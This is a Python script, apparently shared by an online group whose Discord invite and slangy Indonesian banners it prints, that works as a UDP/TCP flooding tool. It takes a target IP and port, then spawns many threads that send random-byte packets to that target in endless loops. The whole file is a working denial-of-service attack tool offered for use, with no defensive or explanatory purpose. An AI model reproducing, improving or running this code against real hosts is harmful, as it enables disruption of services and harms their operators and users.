#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > Sky Community!! < - - ")
print       (" - - > Sky Nih Dek!!!! < - - ")
print       (" - - > Join Sky Community <- - ")                                   
print       (" - - > Rename Join dulu !! < - - ")
print       (" - - > https://discord.gg/av7JxpRtw3 < - - ")
print       (" - - > Tuh link nya Join!! < - - ")
print       (" - - > GaJoin YATIM KATA ILHAM  < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" SERIUS MAU NYERANG? (y/n):"))
times = int(input(" Paket Nya Mau Berapa:"))
threads = int(input(" Pelor Nya Tembakin Berapa:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Paket From Sky Community!!! ")
		except:
			print("[!] Down Kntl!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Paket From Sky Community!!! ")
		except:
			s.close()
			print("[*] Down Kntl!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()